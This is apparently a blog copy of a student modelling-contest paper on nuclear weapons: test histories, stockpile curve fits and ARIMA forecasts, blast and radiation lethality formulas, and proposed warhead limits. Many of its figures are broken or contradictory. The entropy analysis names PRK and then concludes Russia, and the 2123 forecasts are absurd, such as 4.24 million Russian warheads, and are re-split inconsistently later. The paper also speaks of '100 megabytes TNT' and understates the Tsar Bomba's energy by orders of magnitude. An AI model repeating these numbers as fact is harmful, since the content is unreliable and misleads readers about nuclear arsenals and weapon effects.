2019.png" style="zoom:50%;" /><center>Fig.5-2 The graph of the number of nuclear weapon tests from 1945 to 2019 </center>​        According to question a, 10 countries that once possessed nuclear weapons have been  known. In order to facilitate the analysis of question e, 10 countries that once possessed  nuclear weapons given in the form Position in the attachment are analyzed and a broken line  chart is drawn, obtaining the positions of China and Israel on nuclear weapons in Fig5-3, India  and Pakistan on nuclear weapons in Fig5-4 and South Africa and North Korea on nuclear  weapons in Fig5-5. In the positions of countries on nuclear weapons in Fig5-3, Fig5-4 and  Fig5-5, 0 represents no consideration, 1 represents Consideration, 2 represents Pursuit and 3 represents Possession, and the transition year table from "no consideration of nuclear weapons"  to "possession of nuclear weapons" for each country in Tab.5-2 is obtained, and the United States can be seen the transition from "no consideration of nuclear weapons" to "possession of  nuclear weapons" is the fastest. <center>Tab.5-2 A table of countries' transition yearsfrom "no consideration of nuclear weapons "to "possession of nuclear weapons. </center>| country        | Does not consider | Possesses | Year difference || -------------- | ----------------- | --------- | --------------- || India          | 1947              | 1987      | 40              || Pakistan       | 1971              | 1987      | 16              || China          | 1951              | 1964      | 9               || Israel         | 1948              | 1967      | 19              || France         | 1944              | 1960      | 16              || United Kingdom | 1939              | 1952      | 13              || Russia         | 1941              | 1949      | 8               || United States  | 1938              | 1945      | 7               || South Africa   | 1968              | 1979      | 11              || North Korea    | 1961              | 2006      | 45              |<img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/Chart of positions of China and Israel on nuclear weapons.png" style="zoom: 67%;" /><center>Fig.5-3 Chart of positions of China and Israel on nuclear weapons </center><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/India and Pakistan's position on nuclear weapons.png" style="zoom: 67%;" /><center> Fig.5-4 India and Pakistan's position on nuclear weapons</center><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/Position graph of nuclear weapons in South Africa and North Korea.png" style="zoom:67%;" /><center>Fig.5-5 Position graph of nuclear weapons in South Africa and North Korea </center>### 5.3 entropy weight method analyzes the research activity of nuclear weapons<p>To solve question d, we use the entropy weight method to analyze the weight of  variations, using status in the form Tests and stockpile in the form Position the. The principle is as follows: </p><ol><li>Standardize the data, so that the data is distributed between 0 and l. There is a formula  below. </li></ol><p>$$<br>\overline{a_{ij}} = \frac{a_{ij} - \mu_j}{s_j}<br>$$</p><p>​    where,<br>$$<br>𝜇_𝑗 = \frac{1}{n}\sum \limits <em>{i = 1}^n 𝑎</em>{𝑖𝑗}<br>$$</p><p>$$<br>𝑠_𝑗 = \sqrt {\frac{1}{n-1} \sum \limits <em>{i = 1}^n {(a</em>{𝑖𝑗}− 𝜇_𝑗)^2}}<br>$$</p><ol start="2"><li><p>Calculate the information entropy of each index according to the definition of information entropy in information theory, the information entropy of a group of data is below.<br>$$<br>𝐸<em>j= − ln(𝑛) ^{-1}\sum \limits <em>{i = 1}^n 𝑝</em>{𝑖𝑗}ln 𝑝</em>{𝑖𝑗}<br>$$<br>where,<br>$$<br>𝑝_{𝑖𝑗}= \frac{𝑌_{𝑖𝑗}}{\sum \limits _{i = 1}^n 𝑌_𝑦 }<br>$$</p></li><li><p>Finally determine the weight of each index. </p><p>The entropy weight method obtains its Status, the number of Tests, and the Stockpile variation with the weight of 0.0422,0.9198, 0.0380. Calculate it by weight PRK is the most active, and conclude that in the past decade, Russia has been the most active in nuclear weapons research. </p></li></ol><h2 id="6-Model-and-solution-of-problem-two"><a href="#6-Model-and-solution-of-problem-two" class="headerlink" title="6 Model and solution of problem two"></a>6 Model and solution of problem two</h2><h3 id="6-1-Data-preprocessing"><a href="#6-1-Data-preprocessing" class="headerlink" title="6.1 Data preprocessing"></a>6.1 Data preprocessing</h3><p>​        For problem 2, we first conduct pre-processing and check for attachment data Stockpile: whether there are missing values, duplicate values, outlier values, etc. In order to reduce the error, we set the data years from 1945 to 2022 as 1 to 78.And calculate the comparison table of the world’s years and nuclear weapons reserves, as shown in Tab.6-1. </p><center>Tab.6-1Comparison table of years and nuclear weaponsreserves in the world </center>| Year | Stockpile || ---- | --------- || 1    | 2         || 2    | 9         || 3    | 13        || 4    | 50        || …    | …         || 75   | 9325      || 76   | 9330      || 77   | 9458      || 78   | 9440      |<p>​        No missing data or abnormal data has been found after examination for Stockpile. The data Stockpile of each country is relatively complete with a wide range of years and high reliability of data. </p><h3 id="6-2-Problem-2-Model-establishment"><a href="#6-2-Problem-2-Model-establishment" class="headerlink" title="6.2 Problem 2 Model establishment"></a>6.2 Problem 2 Model establishment</h3><p>​        The data is the reserves of nuclear weapons, and the data dimension is relatively low. The year and reserves comparison table of each country can be fitted with the data.The principle of  linear fitting is as follows. </p><ol><li><p>The least square method is used to find the fitting equation of the number of annual nuclear weapons in each country and the world.<br>$$<br>𝑦 = 𝑘̂𝑥 + 𝑏̂<br>$$</p><p>$$<br>𝑘̂ = \frac{ n\sum \limits _{i = 1}^n 𝑥_𝑖 𝑦_𝑖 -\sum \limits _{i = 1}^n 𝑦_𝑖 \sum \limits _{i = 1}^n 𝑥_𝑖 }<br>{ n \sum \limits _{i = 1}^n 𝑥_𝑖^2 − \sum \limits _{i = 1}^n 𝑥_𝑖 \sum \limits _{i = 1}^n 𝑥_𝑖 }<br>$$</p><p>$$<br>𝑏̂ = \frac{ \sum \limits _{i = 1}^n 𝑦_𝑖\sum \limits _{i = 1}^n x_i^2 -\sum \limits _{i = 1}^n x_i𝑦_𝑖 \sum \limits _{i = 1}^n 𝑥_𝑖 }<br>{ n \sum \limits _{i = 1}^n 𝑥_𝑖^2 − \sum \limits _{i = 1}^n 𝑥_𝑖 \sum \limits _{i = 1}^n 𝑥_𝑖 }<br>$$</p></li></ol><p>After the fitting equation is obtained, the goodness of fit of the equation is obtained by using the formula to judge  the fitting effect. When the goodness of fit is close to 1, the fitting effect is better.<br>$$<br>𝑆𝑆𝐸 = \sum \limits _{i = 1}^n {(y_i− 𝑦̂)^2}<br>$$</p><p>$$<br>𝑆𝑆𝑇 = \sum \limits _{i = 1}^n (𝑦_𝑖 − 𝑦̅) ^2<br>$$</p><p>$$<br>𝑆𝑆𝑅 = \sum \limits _{i = 1}^n(𝑦̂_i − 𝑦̅ ) ^2<br>$$</p><p>$$<br>0 ≤ 𝑅^2 = \frac {𝑆𝑆𝑅} {𝑆𝑆𝑇} = \frac{𝑆𝑆𝑇 − 𝑆𝑆𝐸} { 𝑆𝑆𝑇} = 1 − \frac {𝑆𝑆𝐸} {𝑆𝑆𝑇} ≤ 1<br>$$</p><p>For question a, we establish a time series model and solve the model. </p><p><strong>Step 1: Data stationarity test</strong> </p><p>​        Firstly, using Matlab to test the data stationarity. If the data of different countries are found  to be less stable after being brought in, the difference of the original data is taken, and then the  test is carried out until it passes the test. Because there are many countries, we takes China as an  example here, as shown in Fig.6-1.</p><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/Variance analysis diagram of China.png" style="zoom:50%;" /><center>Fig. 6-1 Variance analysis diagram of China </center>**Step 2: Determine the model parameters** <p>​        The model parameters p, q and d were determined by autocorrelation function(ACF) and  partial autocorrelation function(PACF) based on the stabilized data. Where d isthe difference  order, p, q are determined by the order of the following equation using AIC and BIC criteria  through matlab.<br>$$<br>X_𝒕 = 𝒄 + a_𝟏 X_{𝒕−𝟏} + 𝜶<em>𝟐 X</em>{𝒕−𝟐} + ⋯ + 𝜶<em>𝒑 X</em>{𝒕−𝒑} + 𝜺<em>𝒕 + 𝜷_𝟏 𝜺</em>{𝒕−𝟏} + ⋯ + 𝜷<em>𝒒 𝜺</em>{𝒕−𝒒}<br>$$<br>The autocorrelation and partial autocorrelation graphs drawn by matlab are shown in Fig.6-2. </p><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/Autocorrelation and partial autocorrelation pictures of China.png" style="zoom:67%;" /><center>Fig.6-2 Autocorrelation and partial autocorrelation pictures of China </center>**Step 3: Model construction** <p>​        Matlab and its own prediction tool are used to construct and predict the model and Fig. 6-3  is obtained:</p><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/China's time series model prediction chart.png" style="zoom: 60%;" /><center>Fig. 6-3 China's time series model prediction chart </center>### 6.3 Solution of Problem 2 model<p>​        Step 1: For question b, the relationship between the number and year of nuclear weapons in  the country and the world can be obtained by using fitting calculation, as shown in Fig.6-4 to  Fig.6-10. </p><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/Number and Year fitting graph of nuclear weapons of China and France.png" style="zoom: 60%;" /><center>Fig. 6-4 Number and Year fitting graph of nuclear weapons of China and France </center><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/Number and Year fitting graph of nuclear weapons of India and Israel.png" style="zoom:60%;" /><center>Fig.6-5 Number and Year fitting graph of nuclear weapons of India and Israel</center><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/Number and Year fitting graph of nuclear weapons of North Korea and Pakistan.png" style="zoom:60%;" /><center>Fig.6-6 Number and Year fitting graph of nuclear weapons of North Korea and Pakistan</center><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/Number and Year fitting graph of nuclear weapons of Russia and the United Kingdom.png" style="zoom:60%;" /><center>Fig.6-7 Number and Year fitting graph of nuclear weapons of Russia and the United Kingdom</center><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/Number and Year fitting graph of nuclear weapons of the United States and the World.png" style="zoom:60%;" /><center>Fig.6-8 Number and Year fitting graph of nuclear weapons of the United States and the World </center>**The corresponding formula for China is:** $$y = 1.758589586213E − 04𝑥^4 − 2.865922062910𝐸 − 02𝑥^3 + 1.480494595983𝐸 + 00𝑥^2 − 2.075941202614𝐸 + 01𝑥 + 5.980836621847𝐸 + 01$$**The corresponding formula for France is:** $$y = 1.090228106461E − 05𝑥^5 − 1.952155699827𝐸 − 03𝑥^4 + 1.128467098749𝐸 − 01𝑥^3 − 2.222112809877𝐸 + 00𝑥^2 + 1.446885471555𝐸 + 01𝑥 − 2.055355206383𝐸 + 01 $$**The corresponding formula for India is:** $$y = 7.054782608696E + 00x − 3.868930434783E + 02 $$**The corresponding formula for Israel is:** $$y = 1.448564094134E + 00x − 1.776956376956E + 01 $$**The corresponding formula for North Korea is:** $$y = 6.673948873745E − 10𝑥^6 + 1.402428079896𝐸 − 07𝑥^5 − 3.304782580804𝐸 − 05𝑥^4 + 2.028431954671𝐸03𝑥^3 − 4.903423282672𝐸 − 02𝑥^2 + 4.403173966551𝐸 − 01 − 9.591027132012𝐸 − 01 $$**The formula for Pakistan is:** $$y = 7.356153846154E + 00x − 3.989461538462E + 02$$**The corresponding formula for Russia is:** $$y = −2.066025970539E − 04𝑥^5 + 8.395634338470𝐸 − 02𝑥^4 − 9.974565977602𝐸 + 00𝑥^3 + 4.501570472946𝐸 + 02𝑥^2 − 6.887059684175𝐸 + 03𝑥 + 3.024866446426𝐸 + 04 $$**The corresponding formula for United Kingdom is:** $$y = 1.062000638735E − 02𝑥^3 − 1.640238161541𝐸 + 00𝑥^2 + 7.461626511325𝐸 + 01𝑥 − 6.374009978584𝐸 + 02 $$**The corresponding formula for United States is:** $$y = 4.970163822984E − 01𝑥^3 − 7.685975917203𝐸 + 01𝑥^2 + 3.205357479012𝐸 + 03𝑥 − 1.444184629055𝐸 + 04 $$<p><strong>The formula for World is:</strong><br>$$<br>y = −3E − 05𝑥^6 + 0.3048𝑥^5 − 1508.4𝑥^4 + 4𝐸 + 06𝑥^3 − 6𝐸 + 09𝑥^2 + 5𝐸 + 12𝑥 − 2𝐸 + 15<br>$$<br>​        By substituting the number corresponding to the year 2123 into each formula, we can get  the number of nuclear weapons in China, France, India, Israel, North Korea, Pakistan, Russia,  United Kingdom and United States: 58183, 577920, 876, 242, 23938, 918, 4.23864e+006, 21074, 947211. </p><p>​        Through linear fitting, the number of nuclear weapons of each country and the world in  the next 100 years can be preliminarily predicted. In order to further reduce the error and  improve the accuracy, the time series model is used to solve the model. </p><p>​        For question a, ARIMA(p, d, q) model is selected. p, d and q parameters are determined,  and d-order backward difference is calculated. </p><p>$$<br>∇<em>𝑑 𝑌_𝑡=∇</em>{𝑑−1} 𝑌<em>𝑡 − ∇_𝑑 𝑌</em>{𝑡−1} = (1 − 𝐵) ∇_{𝑑−1} 𝑌_𝑡 = ⋯ = (1 − 𝐵)^𝑑𝑌_𝑡<br>$$<br>The arima formula calculated. </p><p>$$<br>((1 − \sum \limits _{i = 1}^p ∅_𝑖 𝐵^𝑖)(1 − 𝐵)^𝑑 𝑌_𝑖 = (1 + \sum \limits _{i = 1}^q 𝜃_𝑖 𝐵^𝑖) 𝜀_𝑖 ↔ (1 − 𝐵)^𝑑 𝑌_𝑖 − \sum \limits _{i = 1}^p ∅𝑖(1 − 𝐵)^𝑑 Y^{𝑡−𝑖} = \sum \limits <em>{i = 1}^q 𝜃_𝑖 𝜀</em>{𝑖−1} +𝜀_𝑖)<br>$$<br>​        Build the model, use the time prediction model tool in spsspro to get the prediction  results, and make the test set more than 90% correct. Finally, the following results are obtained  by importing the data. </p><center>Tab.6-2 Predicted values and goodness of fit of reserves of countries and the world </center>| Country   | China  | France | India  | Israel | Russia || --------- | ------ | ------ | ------ | ------ | ------ || Stockpile | 999.84 | 600.9  | 1277.6 | 218.8  | 2535.5 || R²        | 0.982  | 0.98   | 0.996  | 0.998  | 0.998  |<table><thead><tr><th>Country</th><th>North Korea</th><th>United Kingdom</th><th>United States</th><th>World</th></tr></thead><tbody><tr><td>Stockpile</td><td>45.9</td><td>1128</td><td>1691</td><td>59788</td></tr><tr><td>R²</td><td>0.857</td><td>0.958</td><td>0.992</td><td>0.979</td></tr></tbody></table><p>​        Step 2: Analyze and process the attached data position, and use the time series prediction  model to solve the nuclear weapon states in 100 years. Due to the large amount of data, the  data of ten countries that already know the situation of nuclear weapons are first removed, and  then the status of all countries from 1938 to 2022 are removed, and the 19 countries that are  most likely to possess nuclear weapons in the next 100 years are obtained. Then, the time series model is used to predict the status development of each country in 100 years, and the Tab.6-3  is shown as follows: </p><center>Tab.6-3 Predicted status values and goodness of fit for each country after 100 years </center>| Country     | Forest               | R²    || ----------- | -------------------- | ----- || Algeria     | 0.0898981745892814   | 0.766 || Argentina   | 0.12342365117639151  | 0.826 || Australia   | 0.34926806354026124  | 0.859 || Egypt       | 0                    | 0.889 || Germany     | 0.09465938322576074  | 0.609 || Indonesia   | 0.045994603387985986 | 0.643 || Iran        | 4.3809523809523725   | 0.945 || Iraq        | 0.2600939120120171   | 0.856 || Syria       | 2.172                | 0.913 || Switzerland | 0                    | 0.886 || Sweden      | 0                    | 0.888 || South Korea | 0.25                 | 0.866 || Serbia      | 0.440760108943       | 0.783 || Romania     | 0. 117644254         | 0.814 || Norway      | 0                    | 0.845 || Libya       | 0                    | 0.90  || Japan       | 0.119                | 0.624 || Italy       | 0.04547              | 0.713 |<p>​        We can see that Iran is most likely to have nuclear weapons 100 years from now, so the  countries that have nuclear weapons 100 years from now are Iran, Russia, the United States,  China, France, the United Kingdom, Pakistan, India, Israel, North Korea. </p><h2 id="7-Model-and-solution-of-problem-three"><a href="#7-Model-and-solution-of-problem-three" class="headerlink" title="7 Model and solution of problem three"></a>7 Model and solution of problem three</h2><h3 id="7-1-Solution-and-analysis-of-Question"><a href="#7-1-Solution-and-analysis-of-Question" class="headerlink" title="7.1 Solution and analysis of Question"></a>7.1 Solution and analysis of Question</h3><h4 id="7-1-1-of-nuclear-weapon-Lethality"><a href="#7-1-1-of-nuclear-weapon-Lethality" class="headerlink" title="7.1.1 of nuclear weapon Lethality"></a>7.1.1 of nuclear weapon Lethality</h4><p>​        By establishing the lethality model of the detonating position of nuclear weapons, we can describe it by the killing power of its explosion shock wave and the damage degree of nuclear radiation to human body and environment. The blast wave is a factor to be considered when the missile and the target are detonated in close contact. A model of blast wave power is established to describe the killing power of blast wave. According to the nuclear bomb lethal formula, we can effectively describe the effective killing distance R and area S of nuclear  bomb explosion. </p><p>$$<br>R = C × Q^{\frac {1} {3}}<br>$$</p><p>$$<br>𝑆 = 𝜋 × 𝑅^2<br>$$</p><p>​        Where, C is the constant of proportionality, taking the value of 1.493885, and Q is THT  equivalent.</p><p>​        The calculation of the peak overpressure of the explosion shock wave can be done by using the empirical formula of spherical charge explosion in infinite air medium. </p><p>$$<br>𝛥𝑃_{𝑚𝑎𝑥} = \frac {0.082} {𝑍} + \frac {0.26} {𝑍^2} + \frac {0.69 } {𝑍^3 }<br>$$</p><p>$$<br>𝑍 = 𝑅 𝑄 ^{\frac {1} {3}}<br>$$</p><p>​        Where, ΔP is the explosion shock wave overpressure peak (MPa),Z is the contrast distance (m/kg ),R is the radius of spherical expansion, and Q is the equivalent of TNT. </p><p>​        According to Tab.7-1, the damage grade caused by shock wave can be judged, and the killing radius corresponding to different impact injury grades can be calculated. Mild impact damage radius range [399.04,522.35)𝑄(m), moderate impact damage radius range [264.04,399.04)𝑄(m), severe impact damage radius range [201.91,264.04)𝑄(m), and extremely severe impact damage radius range(0,201.91)𝑄(m).[2] </p><center>Tab.7-1 Impact injury levels </center>| extent                   | Mild  | Moderate | Severe | Very severe || ------------------------ | ----- | -------- | ------ | ----------- || Overpressure range / kPa | 20~30 | 30~60    | 60~100 | \>100       |<p>​        During a nuclear explosion, a large number of neutrons and γ radiation are released .And the extent to which nuclear radiation harms the human body depends mainly on the sum of the neutrons and γ radiation doses absorbed by the human body[1].The formula for  calculatingneutron dose in nuclear radiation is </p><p>$$<br>𝐷_{𝑜𝑛} = 4.9 × 10^7 𝑄 \frac {𝑒^{\frac {−𝑟𝜌} {230}}} {𝑟^2}<br>$$</p><p>$$<br>𝜌 = 1.226 × {[1 − 2.22 × 10^−5 (𝑍 +\frac{𝐻} {𝑍} )]}^{4256}<br>$$</p><p>​        Where, D<del>𝑜𝑛</del>is the neutron dose (Gy), Q is the TNTequivalent (kt),r is the distance from the ground point to the detonation center (m), and ρ is the air density at the half of detonation  height (mg/cm3 ),Z is the elevation of the projection point of the detonation center (m), and H is the explosion height (m). </p><p>​        When is the far zone (rρ &gt; 2000m ∙ mg/cm^3^), the formula for calculating γ radiation dose  of nuclear radiation is<br>$$<br>𝐷_{𝑜𝑟} = 9.1 × 10 ^{−3} 𝐾(𝑄) \frac {𝑒 \frac{−𝑟𝜌} {415}} {𝑟^2}<br>$$<br>​        When it is near region (rρ&lt;2000m ∙ mg/cm^3^ ), the formula for calculating γ radiation dose  of nuclear radiation is </p><p>$$<br>𝐷_{𝑜𝑟} = 2.24 × 10 ^{−2} 𝐾(𝑄) \frac {𝑒 \frac{−𝑟𝜌} {340}} {𝑟^2}<br>$$<br>​        Where,r is the distance from the ground point to the detonation center(m), and ρ is the air density at the half of detonation height (mg/cm3 ),the calculation is the same as formula 7-4, Q  is the nuclear detonation equivalent(kt),coefficient K(Q) = 2.82 × 10^8^× (2 + Q)^1.3^. </p><p>​        Therefore, the absorbed dose of nuclear radiation is 𝐷<del>𝑛𝑟</del>= 𝐷<del>𝑜𝑛</del> +𝐷<del>𝑜𝑟</del>.According to 𝐷<del>𝑛𝑟</del>, the acute radiation degress grade is obtained.This is shown in Tab.7-2. </p><center>Tab.7-2 acute radiological degress grades </center>| Degree                       | Mild | Moderate | Severe | Extremely severe || ---------------------------- | ---- | -------- | ------ | ---------------- || Nuclear  radiation dose / Gy | 1~2  | 2~4      | 4~6    | \>6              |<p>​        The radiation hazard to the environment can be estimated by the degree of damage to  animals and plants. The maximum radiation dose of human body can only be 100mSv (mSv =  mGy × K, K is the variable coefficient, value is 0.5), and the radiation dose of the smallest TNT equivalent nuclear bomb known in the world is beyond the tolerable range of human beings and unfit for human habitation. lf the natural recovery time after the missile explosion exceeds the earth’s 5 billion years of life, it can also be considered destroyed. </p><h4 id="7-1-2-um-number-of-nuclear-bombs-to-destroy-the-Earth"><a href="#7-1-2-um-number-of-nuclear-bombs-to-destroy-the-Earth" class="headerlink" title="7.1.2 um number of nuclear bombs to destroy the Earth"></a>7.1.2 um number of nuclear bombs to destroy the Earth</h4><p>​        The Earth was originally gravitationally collapsed from the remnants of the solar nebula, and to shatter the Earth into a nebula that can no longer be gravitationally held together, the energy produced by the nuclear bomb would need to exceed the gravitational binding energy of the Earth, which the energy required 2.2 × 1032 J. Because 1tTNT = 4.19 × 109 J, so 2.2 × 1032 J is the equivalent of 5.25 × 1022 tTNT, and the number of nuclear bombs in 100 megabytes TNT equivalent is 5.25 × 10^14^. </p><p>​        The number of nuclear bombs in 100-megabyte TNT equivalent needed to blast off the surface of the world is 23.57 × 1012.lf destroying the earth is to make the earth uninhabitable, that is to destroy the living environment of human beings and creatures on the earth. The five conditions for life on Earth are stable sunlight, a safe orbit, suitable temperature, liquid water, and the thickness and composition of the atmosphere. Destroying the atmosphere need 3.2 × 1026J and heating the Earth’s oceans to evaporate and drying out all the land need 7.0 × 1027J . So the number of nuclear bombs in 100-megabyte TNT  equivalent is 1.74 × 1010. </p><h3 id="7-2-Solution-and-analysis-of-b-question"><a href="#7-2-Solution-and-analysis-of-b-question" class="headerlink" title="7.2 Solution and analysis of b question"></a>7.2 Solution and analysis of b question</h3><p>​        “Big Ivan” is the most powerful nuclear bomb known in the world at present, namely the Czar Bomb made in the Soviet era. It is 8m in length, 2.1m in diameter, can weigh up to 27t and has a design TNT equivalent of 100Mt. According to the formula 16 and formula 17, the maximum effective kill radius is 25.55km, resulting in an effective kill area of 2055.05𝑘𝑚^2^,  and the energy of 2.10 × 1013 J released by the shock wave. According to the simulation of nuclear explosion, the altitude of the mushroom cloud is 52.8km, the diameter of the  mushroom cloud head is 204km, and the height of the mushroom cloud head is 11.4km.</p><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/Dimensions of the mushroom cloud.png" style="zoom:67%;" /><center>Fig.7-1 Dimensions of the mushroom cloud </center>​        The radiation radius（500rem）is 6.99km and the area is about 153km². A 500rem dose of ionizing radiation can be fatal in humans within about 1 month, and 15% of survivors will eventually die of cancer as a result of exposure. The fireball has a radius of 7.92km and an  area of 197km².Damage with the ground depends on the height of the blast. The amount of radioactive fallout increases significantly if the ground is touched. Anything inside the fireball will be effectively vaporized. The heavy blast damager adius(20 psi)is 10.1km and  the area is 321km². <p>​        At 20 psi overpressure, heavy concrete structures were severely damaged or dismantled,  with fatalities approaching 100%.The medium blast damage radius (5 psi) is 21.2 km and the area is 1,420 km².At 5 psi overpressure, most residential buildings collapse with widespread injury and death. The potential for fire in commercial and residential damage is high, and damaged buildings are likely to spread fire. The light burst damage radius (1 psi) is 54.6 km and the area is 9,370 km².At an overpressure of about 1 psi, the glass window may break. The thermal radiation radius(Third degree burns) is 64.2 km and the area is 12,960km².Third  degree burns burn all skin and because of the destruction of painful nerves, are usually  painless, which can lead to severe scarring or disability, and may require amputation. </p><center><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/Nuclear explosion with southwesterly wind up_1.png" style="zoom:50%;" /><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/Nuclear explosion with southwesterly wind up_2.png" style="zoom:50%;" /></center><center>Fig.7-2 Nuclear explosion with southwesterly wind up</center>In 1986, there were 70,300 nuclear weapons on in Earth. Today, the global Arsenal has been reduced by 80 percent, leaving an estimated 12,705 nuclear weapons , which not enough to destroy the planet but enough to destroy 18 percent of its land mass. <h3 id="7-3-Solution-and-Analysis-of-c-Question"><a href="#7-3-Solution-and-Analysis-of-c-Question" class="headerlink" title="7.3. Solution and Analysis of c Question"></a>7.3. Solution and Analysis of c Question</h3><p>​        Since the end of the Cold War, steps have been taken to reduce nuclear arsenals and some progress has been made, but the world’s total stockpile of nuclear warheads remains at a very high level. Today, there are 12,705 nuclear warheads in possession by nine countries.Fig.7-3 shows that 86% of nuclear warheads are owned by Russia and the United States, which have a combined stockpile of 8,185. The number of nuclear warheads needed to protect national security is exaggerated. As Fig.7-4 shows, the total global stockpile of nuclear weapons is declining, but at a slower rate than over the past 30 years. Among them, the United States and Russia are slowly reducing their stockpiles. France’s and Israel’s stockpiles are relatively stable. But China, India, North Korea, Pakistan are adding to their stockpiles. The current nuclear states do not seem to be planning nuclear disarmament, but rather to keep large arsenals indefinitely; All are committed to modernizing their remaining nuclear forces, and all seem committed to retaining nuclear weapons indefinitely, in conflict with the Nuclear Non-Proliferation Treaty. In the short term, it is highly unlikely that the world will achieve a total stockpile of zero nuclear weapons and protect the planet from  nuclear destruction. </p><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/Ratio of nuclear warheads among nuclearstatesin 2022.png" style="zoom:50%;" /><center>Fig.7-3 Ratio of nuclear warheads among nuclearstatesin 2022 </center><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/Global stockpile of nuclear warheads 1945-2022.png" style="zoom: 60%;" /><center>Fig.7-4 Global stockpile of nuclear warheads 1945-2022 </center>​        In order to protect the earth and the environment on which we depend, we consider limiting the total number of nuclear warheads in the world to 10% of the land damage caused by a nuclear explosion. By calculation, the global stockpile limit is 7,250 nuclear warheads. Countries that already have nuclear weapons are limited to the number of warheads they need to defend their national security. We chose the number of nuclear warheads that could destroy a large nation as the maximum number of nuclear warheads that a nuclear power could possess. By calculation, the limit for nuclear warheads is 487. <h2 id="8-Model-and-solution-of-problem-four"><a href="#8-Model-and-solution-of-problem-four" class="headerlink" title="8 Model and solution of problem four"></a>8 Model and solution of problem four</h2><h3 id="8-1-discovery"><a href="#8-1-discovery" class="headerlink" title="8.1 discovery"></a>8.1 discovery</h3><ol><li><p>Regarding the basic data analysis, we conclude based on the analysis. </p><ul><li>Russia, the United States, China, France, the United Kingdom, Pakistan, India, Israel, North Korea, South Africa and other countries used to have nuclear weapons. </li><li>The United States has the biggest change in its stockpile, with its stockpile dropping by 6,749. </li><li>The largest number of nuclear weapons tests occurred in 1962, 1958, 1968, 1966, 1966 and 1965, with 178, 116, 79, 76 and 71. </li><li>Russia has been the most active in nuclear weapons research over the past decade. </li><li>The United States has made the fastest transition from “not considering nuclear  weapons” to “possessing nuclear weapons.” </li></ul></li><li><p>Predict the number of nuclear weapons </p><ul><li>In 100 years, the country that might have nuclear weapons is Iran. </li><li>China, France, India, Israel, North Korea, Pakistan, Russia, the United Kingdom, the United States and the World. Each have 58, 183, 577, 920, 876, 242, 23938, 618, 4.23864e+006, 21074, 947211, 1.53598e+007 nuclear weapons. </li></ul></li><li><p>Protect our planet </p><ul><li>Destroying the planet requires at least 1.74 × 1010 nuclear bomb. </li><li>Currently nuclear bombs have a maximum effective kill radius of 25.55km, resulting in an effective kill area of 2055.05km2 and the energy released 2.10 × 1013 J by the shock wave; Not enough to destroy the Earth, but it can destroy 18% of the land area. </li><li>To protect our planet, the total global stockpile limit is 7,250 nuclear warheads, and  the nuclear power limit is 487. </li></ul></li></ol><h3 id="8-2-Recommendations"><a href="#8-2-Recommendations" class="headerlink" title="8.2 Recommendations"></a>8.2 Recommendations</h3><p>​        The Earth is our home, and so far, the only planet suitable for human habitation. But nuclear weapons will cause damage to the biological environment of the earth, and the environment destroyed by nuclear weapons is no longer suitable for human habitation. Therefore, here is my advice to the States possessing nuclear weapons: All nuclear- weapon States should refrain from being the first to use nuclear weapons at any time and under any  circumstances, and refrain from using or threatening to use nuclear weapons against non-nuclear-weapon States or nuclear-weapon-free zones. </p><h2 id="9-Sensitivity-analysis-of-the-model"><a href="#9-Sensitivity-analysis-of-the-model" class="headerlink" title="9 Sensitivity analysis of the model"></a>9 Sensitivity analysis of the model</h2><p>​        According to the analysis of the problem, it is known that status will have a great influence on which countries possess nuclear weapons in the next 100 years. In order to test the sensitivity of the model, direct derivation sensitivity analysis is selected for Algeria’s status data. </p><p>​        Use y to represent the status forecast after 100 years, and x to represent the status data  from 1938 to 2022, representing the initial value data y0. And the following relationship is  satisfied. </p><p>$$<br>𝑓(𝑦, 𝑥) = \frac {𝑑𝑥} {𝑑𝑦} , 𝑦(0) = 𝑦^0<br>$$<br>​        Differential equation of sensitivity can be obtained with respect to differentiation X<del>j</del> . </p><p>$$<br>\frac d {dt} \frac {𝜕y} {𝜕x_j}=j  \frac {𝜕y} {𝜕x_j} + \frac {𝜕f} {𝜕x_j} (S=JṠ+F)<br>$$<br>​        The sensitivity formula can be obtained by 𝑆 taking the derivative of pair x<del>j</del> . </p><p>$$<br>S^𝑠 = −𝐽 ^{−1} 𝐹<br>$$<br>​        SPSS was used to make the roc curve of Syria, and the sensitivity graph was as follows. </p><img src="https://shierjinghuang.github.io/2024/03/31/2022年美赛数学建模/The sensitivity analysis chart of Syria.png" style="zoom: 67%;" /><center>Fig.9-1The sensitivity analysis chart of Syria </center>## 10 del evaluation <h3 id="10-1-advantages-of-the-model"><a href="#10-1-advantages-of-the-model" class="headerlink" title="10.1 advantages of the model"></a>10.1 advantages of the model</h3><ol><li><p>The entropy weight method can ensure that the index weight is not subject to  subjective influence, so that the results can be carried out according to the calculated weight and the results are more objective. </p></li><li><p>The time series model makes full use of the original data, the calculation speed is fast, the precision is high, and the prediction of the future data is more accurate. </p></li></ol><h3 id="10-2-advantages-of-the-model"><a href="#10-2-advantages-of-the-model" class="headerlink" title="10.2 advantages of the model"></a>10.2 advantages of the model</h3><p>​        This paper only predicts the future development of nuclear weapons in the world and in  each country based on the annual attitudes towards nuclear weapons of all countries from  1938 to now, the annual average stockpile of nuclear weapons of all countries, and the total  number of nuclear-weapon states in the world each year. There may be limitations in the data  of characteristic attributes, which can appropriately increase the world and other influential factors affecting nuclear weapons research. </p><h3 id="10-3-l-Improvement"><a href="#10-3-l-Improvement" class="headerlink" title="10.3 l Improvement"></a>10.3 l Improvement</h3><p>​        All in all, the models established in this paper are consistent with the actual situation and  have certain guidance. At the same time, the models can be analyzed at a deeper level. The  models have high classification accuracy and good generalization performance, and can be applied to the study of the impact of explosive weapons on the environment, the impact 